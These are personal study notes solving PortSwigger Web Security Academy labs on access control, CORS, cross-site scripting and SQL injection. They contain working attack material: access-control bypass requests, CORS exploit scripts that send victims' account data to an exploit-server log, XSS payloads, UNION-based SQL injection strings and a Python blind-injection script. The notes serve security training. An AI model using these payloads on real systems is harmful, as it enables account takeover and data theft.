# Portswigger's Web Security Academy

⭐ Read the actual solutions (upsolve).

## Contents

1. [Access Control](#access-control)
2. [Cross Origin Resource Sharing](#cross-origin-resource-sharing-cors)
3. [Cross-site scripting](#cross-site-scripting)
4. [SQL Injection](#sql-injection)

## Access Control

- **Authentication** identifies the user and confirms that they are who they say they are.
- **Session management** identifies which subsequent HTTP requests are being made by that same user.
- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

### User's perspective:

1. Vertical access controls
2. Horizontal access controls
3. Context-dependent access controls

### Parameter-based access control methods: hidden field, cookie, preset query string

```
Lab: Unprotected admin functionality: robots.txt
Lab: Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
Lab: User role controlled by request paramter: login as wiener/peter => go to /admin
Lab: User role can be modified in user profile: 
```

### Platform misconfiguration:
- Restricting certain URLs
- Restricting certain HTTP methods
- *Custom http headers to override restricted urls*

#### Lab: URL-based access control can be circumvented
```http
POST / HTTP/1.1
Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
X-Original-URL: /admin
```

#### Lab: Method-based access control can be circumvented
```
Login as wiener/peter:
PUT /admin-roles HTTP/1.1
Cookie: session=UdlpEENsbTjmMhi15gFrGZLzPJlprpTK
username=wiener&action=upgrade
```

### Horizontal Privilege Escalation
#### Lab: User ID controlled by request parameter
```
Login as wiener/peter:
/my-account?id=carlos

Copy and submit the API key
```

#### Lab: User ID controlled by request parameter, with unpredictable user IDs 
```
Login as wiener/peter:
Go to /post?postId=3, to find carlos' userId.
User that userId to get API key from My Account page.
```

#### Lab: User ID controlled by request parameter with data leakage in redirect
```
Login as wiener/peter
Go to /my-account?id=carlos => it redirects back to home page
Go to /my-account?id=carlos and intercept the response in Burp
Before redirection, the API key for carlos is leaked.
```

### Horizontal to vertical privilege escalation

#### Lab: User ID controlled by request parameter with password disclosure

```
Login as wiener/peter
Go to /my-account?user=administrator
Change input type of password to text
Login as administrator/xj6efi
Delete carlos
```

### Insecure direct object references

When an application uses user-supplied input to access objects directly.

```https://insecure-website.com/customer_account?customer_number=132355```

IDOR vulnerabilities often arise when sensitive resources are located in static files on the server-side filesystem. 

``` https://insecure-website.com/static/12144.txt```

#### Lab: Insecure Direct Object References
```
Login as wiener/peter
Go to /chat and Download Transcript
Intercept request in Burp to see that transcript is being downloaded from /download-transcript/2.txt
Go to /download-transcript/1.txt
Get carlos' password: qahe69
Login to carlos' account
```

### Access control vulnerabilities in multi-step processes

#### Lab: Multi-step process with no access control on one step

```
Login as adminstrator/admin
Observe request for upgrading a user:

POST /admin-roles HTTP/1.1
action=upgrade&confirmed=true&username=wiener

Repeat the request while logged in as wiener
```

### Referer-based access control

#### Lab: Referer-based access control

```
Login as administrator/admin
Go to /admin
Upgrade a user and intercept the request in Burp

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://ace91fd81fbaa096804b8c630061001c.web-security-academy.net/admin

Login as wiener/peter and send the request.
```

### Location-based access control

Circumvented using web proxies, VPNs, or manipulation of client-side geolocation mechanisms.


### Cross Origin Resource Sharing (CORS)

- Browser mechanism for controlled access of resources outside given domain.
- Extends and adds functionality to Same Origin Policy (SOP).
- If a website's CORS policy is poorly configured => cross-domain attacks.
- CORS does not provide protection against cross-site request forgery (CSRF).

### Same Origin Policy

- Aims to prevent websites from attacking each other.
- An origin consists of a URI scheme, domain and port number.
- Without the same-origin policy, if you visited a malicious website, it could send requests to other websites (Facebook, Gmail) whose cookies are already present in the browser and therefore an attacker could retrieve sensitive data.
- SOP only allows embedding of images via the ```<img>``` tag, media via the ```<video>``` tag and JavaScript includes with the ```<script>``` tag.
- **Any JavaScript on the page won't be able to read the contents of the above resources.**
- SOP more relaxed when dealing with cookies, can be accessible from subdomains.
- Possible to relax same-origin policy using document.domain.

### Relaxation in SOP
- CORS protocol uses HTTP headers to define trusted web origin and authentication access.
- These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

### Access-Control-Allow-Origin response header

** ```normal-website.com``` sends the following cross-origin request: **

```http
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com 
```

** ```robust-website.com``` replies with: **

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com 
```

**The browser will allow code running on ```normal-website.com``` to access the response because the origins match.**

- No browser supports multiple origins and there are restrictions on the use of the wildcard *.
- Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.
- So some applications take the easy route of effectively allowing access from any other domain.

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=... 
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

#### Lab: CORS vulnerability with basic origin reflection

1. Login as wiener/peter
2. Go to /my-account
3. /my-account?id=admin is blocked


```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S


Access-Control-Allow-Origin: https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net
Access-Control-Allow-Credentials: true
```

Go to exploit server:
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();function reqListener() {
	location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
};
```

Submit exploit to victim and go to /log:
```
192.168.1.12    2020-02-05 19:14:00 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22hvhwIMzFHlIEZpEPGhdJ9EAzV06nOMmw%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/661765"
```

### Errors parsing Origin headers

- Multiple origin access using a whitelist of allowed origins.
- Supplied origin is compared to the whitelist.
- These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions.

### Whitelisted null origin value

- Origin header supports the value ```null```.
- Whitelist the null origin to support local development.
	- Cross-site redirects.
	- Requests from serialized data.
	- Request using the file: protocol.
	- Sandboxed cross-origin requests.
- Sandboxed iframe cross-origin request:

#### Lab: CORS vulnerability with trusted null origin

Send this to the victim.

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acbd1fbe1fd78cf3807331b900be00fc.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://ac6c1fc91feb8cf080ee316001f5002a.web-security-academy.net/log?key='+this.responseText;
};
</script>"></iframe> 
```

Check the log

```
192.168.1.12    2020-02-06 19:27:31 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22oyEfZl4UJC3kIc6IvycliwYYSdIwliXj%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/939914"
```

### Exploiting XSS via CORS trust relationships 

- If Website A trusts Website B, and Website B is vulnerable to XSS
- Attack can exploit XSS to inject JavaScript that uses CORS to retrieve sensitive information.

Given the following request

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
```

If the following origins are allowed

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
```

You could chain CORS and XSS as follows

``` https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>```

### Breaking TLS with poorly configured CORS

- An application uses HTTPS but whitelists a trusted subdomain that is using plain HTTP.

1. The victim user makes any plain HTTP request.
2. The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com
3. The victim's browser follows the redirect.
4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com
5. The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com
6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

#### Lab: CORS vulnerability with trusted insecure protocols

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac141fb91e0fb1fb80430683009d0046.web-security-academy.net/my-account?id=administrator',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location = "https://ac061f511ee2b1b680d60692012f00fd.web-security-academy.net/log?key=this.responseText";
}
</script>
```

### Intranets and CORS without credentials

- Without ACAO header we can't get cookies, but we can still access the website.
- There is one common situation where an attacker can't access a website directly.
- Internal websites are often held to a lower security standard than external sites.

#### Lab: CORS vulnerability with internal network pivot attack

```TBD```


## Cross-site Scripting

It allows an attacker to circumvent the same origin policy.

### Types

- [Reflected](#reflected-xss)
- [Stored](#stored-xss)
- [DOM](#dom-xss)

### Reflected XSS

Includes unsafe data from an HTTP request in the immediate response.

How to:

- Test every entry point: parameters, message body, URL file path, HTTP headers.
- Submit random alphanumeric values: determine whether it is reflected in response.
- Determine the reflection context: between tags, within quoted tag attribute, within javascript string, etc.
- Test a candidate payload: using Burp Repeater send random value + payload and see if it works.
- Test alternative payloads: based on context of reflection and input validation.
- Test the attack in a browser.

#### Lab: Reflected XSS into HTML context with nothing encoded

Search bar ```<img src=x onerror=alert(1)>```

#### Lab: Reflected XSS into HTML context with most tags and attributes blocked

```<h1>0 search results for 'asdf'</h1>```

- ```<script>alert(document.cookie)</script>``` tags not allowed.
- ```alert(document.cookie)``` is not blocked.
- ```<>``` tags not allowed.
- No URL encoding.

Couldn't figure it out after a long time, so looked at the solution.

- Use Burp to intercept search request.
- Send request to Intruder.
- Use Portswigger's XSS cheat sheet (copy payloads).
- Saw that ```<body>``` returned 200.
- Use events (from cheat sheet) along with blockquote.
- ```<body resize=1>``` returned 200.
- But, we need to resize the body to trigger the payload.
- Therefore, change width ```onload```.

```
<iframe src="https://acd01f971f79e697801234c9007200e0.web-security-academy.net/?search=%3Cbody+onresize%3Dalert%28document.cookie%29%3E" onload=this.style.width='100px'>
```

### Stored XSS

Includes unsafe data from an untrusted source in its later HTTP responses.

How to:

- Test entry points:
	- URL query string, message body
	- URL file path
	- HTTP request headers
	- Out-of-band routes
	
- Test exit points:
	- Since it is challenging
	- Test if value appears in immediate response
	- If it does, test if it appears in consequent responses

#### Lab: Stored XSS into HTML context with nothing encoded

Comment ```<img src=x onerror=alert(1)>```

## DOM XSS

Includes unsafe data into the DOM.

- Need to place data into a source such that it propogates into a sink to execute arbritrary javascript.
- Most common source for DOM XSS is the URL.
- Generally need to use browser's developer tools.

### Testing HTML Sinks

1. Place random alphanumeric string into a source (such as ```location.search```).
2. Use developer tools ```Ctrl-F``` to check where your string appears (view source won't work).
3. Identify context. Refine input. Infer processing (single quotes, double quotes).

#### Note about URL-encoding

- Browsers behave differently with respect to URL encoding.
- Chrome, Firefox, Safari encode ```location.search``` and ```location.hash```.
- IE11 and Edge (pre-Chromium) don't encode sources.

### Testing JS Sinks

- Input doesn't appear in DOM.
- Need to use Debugger in developer tools.
- For each source (like ```location```) find cases in JS code where it is referenced.
- Find it in the developer tools ```Ctrl-Shift-F``` and add a breakpoint to see how the value is used.

### Exploiting DOM XSS with different sources and sinks

#### Lab: DOM XSS in document.write sink using source location.search

The sink and source are in embedded javascript within the search page.

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}	
```

Using this payload ```x"><script>alert(1)</script><img src="x``` the document.write will look like:

```
<img src="/resources/images/tracker.gif?searchTerms=x"><script>alert(1)</script><img src="x">
```

Intended solution ```"><svg onload=alert(1)>```

#### Lab: DOM XSS in document.write sink using source location.search inside a select element

Relevant code

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

- We see that ```storeId``` is acting as a sink.
- As soon as we add it to the query, we get it as an option in select.
- We will have to close option and select tags and then inject our alert payload.

```html
<select name="storeId">
	<option>London</option>
	<option>Paris</option>
	<option>Milan</option>
</select>
```

Working payload ```</option></select><svg onload=alert(1)>```

Intended solution ```"></select><img src=1 onerror=alert(1)>```


- The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.
- This means you will need to use alternative elements like img or iframe.

```element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'```

#### Lab: DOM XSS in innerHTML sink using source location.search

Relevant code

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

Doesn't work ```</span><script>alert(1)</script><span>``` (due to innerHTML restrictions above)

Does work ```<img src=1 onerror=alert(1)>```

### jQuery

```attr()``` used to change attributes, can act as a sink.

#### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
>
>To solve this lab, make the "back" link alert document.cookie. 


Relevant code

```javascript
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Putting ```/feedback?returnPath=javascript:alert(1)``` pops alert on clicking the link, but we need a 0-click payload.

Doesn't work ```/feedback?returnPath="><img src=x onerror=alert(1)><a href="```

Works ```/feedback?returnPath=javascript:onload=alert(document.cookie)```

### AngularJS

- ```ng-app``` attribute is processed by AngularJS.
- Anything within ```{{}}``` will be executed.

#### [Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression): DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
>
> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
>
> To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from this [blog](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) by Gareth Heyes I found out the corresponding payload in Angular >= 1.6.0 which doesn't have a sandbox. ```{{constructor.constructor('alert(1)')()}}```

Intended solution ```{{$on.constructor('alert(1)')()}}```

### Reflected DOM XSS

The website includes unsafe data from the request and places it into javascript or DOM.

```eval('var data = "reflected string"');```

#### [Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected): Reflected DOM XSS

In file searchResult.js breakpoint at line 5.

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

In console check value of ```this.responseText```

```javascript
"{\"searchTerm\":\"asdf\",\"results\":[]}"
```

Therefore searchTerm under searchResultObj is user supplied. It is being sunk at line 19.

```javascript
h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
```

XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-prevent-xss).

## SQL Injection

#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns): SQL injection UNION attack, determining the number of columns returned by the query

1. Initial request: `GET /filter?category=Food+%26+Drink`
2. Guess: `SELECT name, price FROM products WHERE category='[input]'`
3. SQL query attempts:
    - `/filter?category='+ORDER+BY+3--`
    - `/filter?category='+UNION+SELECT+id,name,price+FROM+products--`
4. Just had to return an additional row containing null values.

#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text): SQL injection UNION attack, finding a column containing text 

- `/filter?category=Corporate+gifts'+UNION+SELECT+price,null,null+FROM+products--`
- `/filter?category=Corporate+gifts'+UNION+SELECT+1337,table_name,null+FROM+information_schema.tables--`
- `/filter?category='+UNION+SELECT+null,column_name,null+FROM+information_schema.columns+WHERE+table_name='products'--`
- `/filter?category='+UNION+SELECT+null,'0tb9ew',null+FROM+products--` :/

#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables): SQL injection UNION attack, retrieving data from other tables

- `/filter?category=Gifts'+ORDER+BY+2--`
- `/filter?category=Gifts'+union+select+username,password+from+users--`

#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column): SQL injection UNION attack, retrieving multiple values in a single column
`/filter?category=Gifts'+union+select+1,username||':'||password+from+users--`

#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle): SQL injection attack, querying the database type and version on Oracle
`/filter?category='+union+select+null,banner+FROM+v$version--`

#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft): SQL injection attack, querying the database type and version on MySQL and Microsoft
`/filter?category=Gifts'+union+select+@@version,null+--+`

#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle): SQL injection attack, listing the database contents on non-Oracle databases

- `/filter?category='+union+select+version(),null--`
- `/filter?category='+union+select+table_name,null+from+information_schema.tables--` 
- `/filter?category='+union+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_tgviyo'--`
- `/filter?category='+union+SELECT+username_bzrpfl,password_mignev+from+users_tgviyo--`

#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle): SQL injection attack, listing the database contents on Oracle

- `/filter?category='+union+select+null,table_name+from+all_tables--`
- `/filter?category='+union+select+null,column_name+from+all_tab_columns+where+table_name='USERS_QCHNKE'`
- `/filter?category='+union+select+USERNAME_NREBWP,PASSWORD_TKLBZQ+from+USERS_QCHNKE--`


#### [Lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses): Blind SQL injection with conditional responses

```python
for j in range(1,50):
    for i in string.printable:
        payload = "' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password,1,"+str(j)+")='"+(k+i)+"'--"
        cookies = {'TrackingId':'xyz' + payload}
        r = requests.get(url, cookies=cookies)
        if 'Welcome back!' in r.text:
            k += i
            print(k)
            break
```


